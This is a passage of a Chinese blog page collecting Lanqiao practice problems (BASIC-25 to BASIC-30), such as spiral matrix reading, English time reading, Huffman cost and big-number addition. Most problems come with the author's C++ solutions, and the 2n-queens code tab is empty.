输入第一行是两个不超过200的正整数m, n，表示矩阵的行和列。接下来m行每行n个整数，表示这个矩阵。</li><li>输出格式<br>　　输出只有一行，共mn个数，为输入矩阵回形取数得到的结果。数之间用一个空格分隔，行末不要有多余的空格。</li><li>样例输入<br> 3 3<br> 1 2 3<br> 4 5 6<br> 7 8 9</li><li>样例输出<br> 1 4 7 8 9 6 3 2 5</li><li>样例输入<br> 3 2<br> 1 2<br> 3 4<br> 5 6</li><li>样例输出<br> 1 3 5 6 4 2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">205</span>][<span class="number">205</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(arr,<span class="number">-1</span>,<span class="keyword">sizeof</span>(arr));</span><br><span class="line">    <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j&lt;=n ; j++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; arr[i][j];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; arr[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    arr[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">1</span>, y=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[x+<span class="number">1</span>][y]==<span class="number">-1</span> &amp;&amp; arr[x<span class="number">-1</span>][y]==<span class="number">-1</span> &amp;&amp; arr[x][y+<span class="number">1</span>]==<span class="number">-1</span> &amp;&amp; arr[x][y<span class="number">-1</span>]==<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag==<span class="number">0</span> &amp;&amp; arr[x+<span class="number">1</span>][y]==<span class="number">-1</span>)</span><br><span class="line">            flag = (++flag)%<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag==<span class="number">1</span> &amp;&amp; arr[x][y+<span class="number">1</span>]==<span class="number">-1</span>)</span><br><span class="line">            flag = (++flag)%<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag==<span class="number">2</span> &amp;&amp; arr[x<span class="number">-1</span>][y]==<span class="number">-1</span>)</span><br><span class="line">            flag = (++flag)%<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag==<span class="number">3</span> &amp;&amp; arr[x][y<span class="number">-1</span>]==<span class="number">-1</span>)</span><br><span class="line">            flag = (++flag)%<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (flag)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: x++; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: y++; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: x--; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>: y--; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr[x][y];</span><br><span class="line">        arr[x][y] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-26-VIP试题-报时助手"><a href="#BASIC-26-VIP试题-报时助手" class="headerlink" title="BASIC-26    VIP试题 报时助手"></a>BASIC-26    VIP试题 报时助手</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　给定当前的时间，请用英文的读法将它读出来。<br>　　时间用时h和分m表示，在英文的读法中，读一个时间的方法是：<br>　　如果m为0，则将时读出来，然后加上“o’clock”，如3:00读作“three o’clock”。<br>　　如果m不为0，则将时读出来，然后将分读出来，如5:30读作“five thirty”。<br>　　时和分的读法使用的是英文数字的读法，其中0~20读作：<br>　　0:zero, 1: one, 2:two, 3:three, 4:four, 5:five, 6:six, 7:seven, 8:eight, 9:nine, 10:ten, 11:eleven, 12:twelve, 13:thirteen, 14:fourteen, 15:fifteen, 16:sixteen, 17:seventeen, 18:eighteen, 19:nineteen, 20:twenty。<br>　　30读作thirty，40读作forty，50读作fifty。<br>　　对于大于20小于60的数字，首先读整十的数，然后再加上个位数。如31首先读30再加1的读法，读作“thirty one”。<br>　　按上面的规则21:54读作“twenty one fifty four”，9:07读作“nine seven”，0:15读作“zero fifteen”。</li><li>输入格式<br>　　输入包含两个非负整数h和m，表示时间的时和分。非零的数字前没有前导0。h小于24，m小于60。</li><li>输出格式<br>　　输出时间时刻的英文。</li><li>样例输入<br> 0 15</li><li>样例输出<br> zero fifteen</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> time[] = &#123;<span class="string">&quot;zero&quot;</span>, <span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>, <span class="string">&quot;four&quot;</span>, <span class="string">&quot;five&quot;</span>, <span class="string">&quot;six&quot;</span>, <span class="string">&quot;seven&quot;</span>, <span class="string">&quot;eight&quot;</span>, <span class="string">&quot;nine&quot;</span>, <span class="string">&quot;ten&quot;</span>, <span class="string">&quot;eleven&quot;</span>, <span class="string">&quot;twelve&quot;</span>, <span class="string">&quot;thirteen&quot;</span>, <span class="string">&quot;fourteen&quot;</span>, <span class="string">&quot;fifteen&quot;</span>, <span class="string">&quot;sixteen&quot;</span>, <span class="string">&quot;seventeen&quot;</span>, <span class="string">&quot;eighteen&quot;</span>, <span class="string">&quot;nineteen&quot;</span>, <span class="string">&quot;twenty&quot;</span>, <span class="string">&quot;thirty&quot;</span>, <span class="string">&quot;forty&quot;</span>, <span class="string">&quot;fifty&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> h, m;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; h &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(h &lt;= <span class="number">20</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; time[h] &lt;&lt; <span class="string">&quot; o&#x27;clock&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = h%<span class="number">10</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;twenty &quot;</span> &lt;&lt; time[a] &lt;&lt; <span class="string">&quot; o&#x27;clock&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(h &lt;= <span class="number">20</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; time[h] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = h%<span class="number">10</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;twenty &quot;</span> &lt;&lt; time[a] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(m &lt;= <span class="number">20</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; time[m];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = m%<span class="number">10</span>, b = m/<span class="number">10</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; time[<span class="number">18</span>+b] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; time[a];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-27-VIP试题-2n皇后问题"><a href="#BASIC-27-VIP试题-2n皇后问题" class="headerlink" title="BASIC-27    VIP试题 2n皇后问题"></a>BASIC-27    VIP试题 2n皇后问题</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　给定一个n*n的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入n个黑皇后和n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n小于等于8。</li><li>输入格式<br>　　输入的第一行为一个整数n，表示棋盘的大小。<br>　　接下来n行，每行n个0或1的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为0，表示对应的位置不可以放皇后。</li><li>输出格式<br>　　输出一个整数，表示总共有多少种放法。</li><li>样例输入<br> 4<br> 1 1 1 1<br> 1 1 1 1<br> 1 1 1 1<br> 1 1 1 1</li><li>样例输出<br> 2</li><li>样例输入<br> 4<br> 1 0 1 1<br> 1 1 1 1<br> 1 1 1 1<br> 1 1 1 1</li><li>样例输出<br> 0</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-28-VIP试题-Huffuman树"><a href="#BASIC-28-VIP试题-Huffuman树" class="headerlink" title="BASIC-28    VIP试题 Huffuman树"></a>BASIC-28    VIP试题 Huffuman树</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</p></li><li><p>问题描述<br> 　　Huffman树在编码中有着广泛的应用。在这里，我们只关心Huffman树的构造过程。<br> 　　给出一列数{pi}={p0, p1, …, pn-1}，用这列数构造Huffman树的过程如下：<br> 　　1. 找到{pi}中最小的两个数，设为pa和pb，将pa和pb从{pi}中删除掉，然后将它们的和加入到{pi}中。这个过程的费用记为pa + pb。<br> 　　2. 重复步骤1，直到{pi}中只剩下一个数。<br> 　　在上面的操作过程中，把所有的费用相加，就得到了构造Huffman树的总费用。<br> 　　本题任务：对于给定的一个数列，现在请你求出用该数列构造Huffman树的总费用。</p><p> 　　例如，对于数列{pi}={5, 3, 8, 2, 9}，Huffman树的构造过程如下：<br> 　　1. 找到{5, 3, 8, 2, 9}中最小的两个数，分别是2和3，从{pi}中删除它们并将和5加入，得到{5, 8, 9, 5}，费用为5。<br> 　　2. 找到{5, 8, 9, 5}中最小的两个数，分别是5和5，从{pi}中删除它们并将和10加入，得到{8, 9, 10}，费用为10。<br> 　　3. 找到{8, 9, 10}中最小的两个数，分别是8和9，从{pi}中删除它们并将和17加入，得到{10, 17}，费用为17。<br> 　　4. 找到{10, 17}中最小的两个数，分别是10和17，从{pi}中删除它们并将和27加入，得到{27}，费用为27。<br> 　　5. 现在，数列中只剩下一个数27，构造过程结束，总费用为5+10+17+27=59。</p></li><li><p>输入格式<br>　　输入的第一行包含一个正整数n（n&lt;=100）。<br>　　接下来是n个正整数，表示p0, p1, …, pn-1，每个数不超过1000。</p></li><li><p>输出格式<br>　　输出用这些数构造Huffman树的总费用。</p></li><li><p>样例输入<br> 5<br> 5 3 8 2 9</p></li><li><p>样例输出<br> 59</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">doingsort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pCur = left;</span><br><span class="line">    <span class="keyword">int</span> pPre = pCur<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> key = arr[right];</span><br><span class="line">    <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>; </span><br><span class="line">    <span class="keyword">if</span>( (arr[mid]&gt;=arr[left] &amp;&amp; arr[mid]&lt;=key) || (arr[mid]&gt;=key &amp;&amp; arr[mid]&lt;=arr[left]) )</span><br><span class="line">    &#123;</span><br><span class="line">        arr[right] = arr[mid];</span><br><span class="line">        arr[mid] = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( (arr[left]&gt;=arr[mid] &amp;&amp; arr[left]&lt;=key) || (arr[left]&gt;=key &amp;&amp; arr[left]&lt;=arr[mid]) )</span><br><span class="line">    &#123;</span><br><span class="line">        arr[right] = arr[left];</span><br><span class="line">        arr[left] = key;</span><br><span class="line">    &#125;</span><br><span class="line">    key = arr[right];</span><br><span class="line">    <span class="keyword">while</span>(pCur &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( arr[pCur]&gt;key &amp;&amp; ++pPre!=pCur)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> xxx = arr[pCur];</span><br><span class="line">            arr[pCur] = arr[pPre];</span><br><span class="line">            arr[pPre] = xxx;</span><br><span class="line">        &#125;</span><br><span class="line">        pCur++;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[right] = arr[pPre+<span class="number">1</span>];</span><br><span class="line">    arr[pPre+<span class="number">1</span>] = key;</span><br><span class="line">    <span class="keyword">return</span> ++pPre;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(right-left &gt;= <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = doingsort(arr, left, right);</span><br><span class="line">        quicksort(arr, left, ret);</span><br><span class="line">        quicksort(arr, ret+<span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">int</span> num, sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line">    num--;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= num; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    <span class="keyword">while</span> (num&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        quicksort(arr, <span class="number">0</span>, num);</span><br><span class="line">        arr[--num] += arr[num+<span class="number">1</span>];</span><br><span class="line">        sum += arr[num];  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-29-VIP试题-高精度加法"><a href="#BASIC-29-VIP试题-高精度加法" class="headerlink" title="BASIC-29    VIP试题 高精度加法"></a>BASIC-29    VIP试题 高精度加法</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　输入两个整数a和b，输出这两个整数的和。a和b都不超过100位。</li><li>算法描述<br>　　由于a和b都比较大，所以不能直接使用语言中的标准数据类型来存储。对于这种问题，一般使用数组来处理。<br>　　定义一个数组A，A[0]用于存储a的个位，A[1]用于存储a的十位，依此类推。同样可以用一个数组B来存储b。<br>　　计算c = a + b的时候，首先将A[0]与B[0]相加，如果有进位产生，则把进位（即和的十位数）存入r，把和的个位数存入C[0]，即C[0]等于(A[0]+B[0])%10。然后计算A[1]与B[1]相加，这时还应将低位进上来的值r也加起来，即C[1]应该是A[1]、B[1]和r三个数的和．如果又有进位产生，则仍可将新的进位存入到r中，和的个位存到C[1]中。依此类推，即可求出C的所有位。<br>　　最后将C输出即可。</li><li>输入格式<br>　　输入包括两行，第一行为一个非负整数a，第二行为一个非负整数b。两个整数都不超过100位，两数的最高位都不是0。</li><li>输出格式<br>　　输出一行，表示a + b的值。</li><li>样例输入<br> 20100122201001221234567890<br> 2010012220100122</li><li>样例输出<br> 20100122203011233454668012</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1, s2;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s1 &gt;&gt; s2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s1.length()/<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> a = s1[i];</span><br><span class="line">        s1[i] = s1[s1.length()<span class="number">-1</span>-i];</span><br><span class="line">        s1[s1.length()<span class="number">-1</span>-i] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s2.length()/<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> a = s2[i];</span><br><span class="line">        s2[i] = s2[s2.length()<span class="number">-1</span>-i];</span><br><span class="line">        s2[s2.length()<span class="number">-1</span>-i] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( s1.length()&lt;s2.length())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> x = s1;</span><br><span class="line">        s1 = s2;</span><br><span class="line">        s2 = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s2.length(); i++)</span><br><span class="line">        s1[i] += s2[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s1.length(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s1[i]-<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != s1.length()<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> x = s1[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s1[i] = x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s1[i+<span class="number">1</span>] += x/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> x = s1[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                s1[i] = x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">while</span>(x/=<span class="number">10</span>)</span><br><span class="line">                    s1 += x%<span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = s1.length()<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; s1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-30-VIP试题-阶乘计算"><a href="#BASIC-30-VIP试题-阶乘计算" class="headerlink" title="BASIC-30    VIP试题 阶乘计算"></a>BASIC-30    VIP试题 阶乘计算</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　输入一个正整数n，输出n!的值。<br>　　其中n!=1<em>2</em>3<em>…</em>n。</li><li>算法描述<br>　　n!可能很大，而计算机能表示的整数范围有限，需要使用高精度计算的方法。使用一个数组A来表示一个大整数a，A[0]表示a的个位，A[1]表示a的十位，依次类推。<br>　　将a乘以一个整数k变为将数组A的每一个元素都乘以k，请注意处理相应的进位。<br>　　